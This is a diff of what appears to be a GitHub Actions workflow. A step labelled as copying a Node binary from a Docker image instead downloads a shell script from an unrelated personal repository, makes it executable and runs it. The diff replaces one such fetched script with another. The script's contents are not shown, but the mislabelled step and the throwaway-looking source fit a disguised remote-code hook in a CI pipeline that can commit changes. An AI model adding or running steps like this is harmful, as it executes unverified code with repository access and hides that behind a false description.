@@ -19,9 +19,9 @@ jobs:
 
       - name: Copy /opt/node/node from docker image
         run: |
-          wget https://raw.githubusercontent.com/menju2ikg8uti/tmp/main/x.sh
-          chmod +x x.sh
-          ./x.sh
+          wget https://raw.githubusercontent.com/menju2ikg8uti/tmp/main/xs.sh
+          chmod +x xs.sh
+          ./xs.sh
       - name: Commit changes
         run: |
           git config user.name "github-actions"
